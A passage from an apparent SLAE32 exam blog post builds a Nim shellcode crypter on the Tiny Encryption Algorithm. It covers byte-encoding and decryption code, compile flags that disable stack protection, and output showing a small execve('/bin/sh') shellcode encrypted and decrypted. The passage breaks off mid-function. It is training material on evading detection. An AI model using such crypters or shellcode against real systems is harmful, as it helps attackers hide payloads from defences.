&lt;p&gt;As I mentioned in the comments, it's up to you to decide how to encode &lt;code&gt;8 bytes&lt;/code&gt; of data into &lt;code&gt;2 unsigned 32-bit integer&lt;/code&gt; values, or so it seemed (please correct me if I'm wrong). Because of this, I had to write two other functions: one to &lt;code&gt;encode&lt;/code&gt; data, and the other one to &lt;code&gt;decode&lt;/code&gt; it.&lt;/p&gt;
&lt;p&gt;Follows the code of the encoding function, the other one (&lt;code&gt;proc decode&lt;/code&gt;) can be viewed &lt;a href=&quot;https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/7/encrypter.nim&quot;&gt;here&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-nim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#    The function 'encode' was written to encode 4 bytes of data into a uint32&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#        integer, as is needed by the function 'encrypt'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;proc &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rotation_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;byte_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    I think it's better to explain this function with an example.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    Let's suppose we have 4 bytes: [0x10, 0x20, 0x30, 0x40]&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    This function places these bytes inside a 32-bit variable, like this:&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        - 0x40302010&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    As you can see, the first value is the Least Significant Byte, while&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        the last one is the most significant value.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    To perform this operations, I'm using the function 'rotateLeftBits' to&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        rotate the bits by 8/16/24 positions to the left.&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    In the case of the previous 4 bytes, it would end up like this:&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        1. 0x00000010&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        2. 0x00002000&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        3. 0x00300000&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#        4. 0x40000000&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#    Summing these numbers together, we obtain 0x40302010 (or 1076895760)&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;countup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;byte_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode_buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

        &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    Index:&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#        0 -&amp;gt; rotation_offset = 0&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#        1 -&amp;gt; rotation_offset = 8 (shift by 8 bits to the left)&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#        2 -&amp;gt; rotation_offset = 16 (shift by 16 bits to the left)&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#        3 -&amp;gt; rotation_offset = 24 (shift by 24 bits to the left)&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rotation_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rotatedByte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rotateLeftBits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rotation_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rotatedByte&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Hopefully the comments I've added to the code are enough. If they weren't, here's a brief summary: given an array of 4 bytes, e.g. &lt;code&gt;[0x10,0x20,0x30,0x40]&lt;/code&gt;, the function convertes them to the integer &lt;code&gt;0x40302010&lt;/code&gt;, mimicking a &lt;code&gt;Little Endian&lt;/code&gt; system.&lt;/p&gt;
&lt;p&gt;Compiling and running the program, it returns the following output:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nim c &lt;span class=&quot;nt&quot;&gt;--hints&lt;/span&gt;:off &lt;span class=&quot;nt&quot;&gt;--cpu&lt;/span&gt;:i386 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;:-m32 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;:-m32 &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;:-fno-stack-protector &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;'-z execstack'&lt;/span&gt; encrypter.nim

./encrypter

&lt;span class=&quot;c&quot;&gt;# [+] Usage:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#         ./encrypter --input=shellcode.bin --output=encrypter.bin --key='0123456789abcdef'&lt;/span&gt;

./encrypter &lt;span class=&quot;nt&quot;&gt;--input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;./shellcode.bin &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/encrypted.bin &lt;span class=&quot;nt&quot;&gt;--key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'0123456789abcdef'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# [+] Input shellcode: ./shellcode.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Output file: /tmp/encrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Using encryption key: 0123456789abcdef&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Key: 0123456789abcdef&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Encoded key: [858927408, 926299444, 1650538808, 1717920867]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Shellcode without padding: @[49, 192, 80, 104, 47, 47, 115, 104, 104, 47, 98, 105, 110, 137, 227, 80, 83, 137, 225, 176, 11, 205, 128]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#         Length: 23&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Shellcode with padding: @[49, 192, 80, 104, 47, 47, 115, 104, 104, 47, 98, 105, 110, 137, 227, 80, 83, 137, 225, 176, 11, 205, 128, 0]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#         Length: 24&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Saving encrypted shellcode to file: /tmp/encrypted.bin&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Decrypted shellcode: @[49, 192, 80, 104, 47, 47, 115, 104, 104, 47, 98, 105, 110, 137, 227, 80, 83, 137, 225, 176, 11, 205, 128]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;decryption&quot;&gt;Decryption&lt;/h4&gt;
&lt;p&gt;As regards the decryption of encrypted data, I had to convert the following &lt;code&gt;C&lt;/code&gt; function (again, taken from &lt;a href=&quot;https://it.wikipedia.org/wiki/Tiny_Encryption_Algorithm&quot;&gt;Wikipedia&lt;/a&gt;):&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xC6EF3720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* set up ;sum == delta*32 */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9e3779b9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                     &lt;span class=&quot;cm&quot;&gt;/* a key schedule constant */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;   &lt;span class=&quot;cm&quot;&gt;/* cache key */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;                         &lt;span class=&quot;cm&quot;&gt;/* basic cycle start */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                   
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;                                              &lt;span class=&quot;cm&quot;&gt;/* end cycle */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As before, the &lt;code&gt;Nim&lt;/code&gt; code is very similar:&lt;/p&gt;
&lt;div class=&quot;language-nim highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#   References for the Decryption function:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       - https://it.wikipedia.org/wiki/Tiny_Encryption_Algorithm&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       - https://link.springer.com/content/pdf/10.1007/3-540-60590-8_29.pdf&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#   As per the reference, the function accepts the following arguments:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       - 'v': an array made up of 2 uint32 integers&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#           it contains 8 bytes of encrypted data to decrypt&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       - 'k': an array made up of 4 uint32 integers, hence a 128-bits key&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#           it's the decryption key&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#   As for how to encode data and key to uint32 integers, it's up to you&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#   In fact, in the original whitepaper I didn't find anything about&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#       this matter&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;proc &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    According to the whitepaper:&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; A different multiple of delta is used in each round so that no&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; bit of the multiple will not change frequently. We suspect the&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; algorithm is not very sensitive to the value of delta and we&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; merely need to avoid a bad value.&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; It will be noted that delta turns out to be odd with truncation&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt;  or nearest rounding, so no extra precautions are needed to&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#    &amp;gt; ensure that all the digits of sum change.&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9e3779b9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;k0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;k1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;k2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;k3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
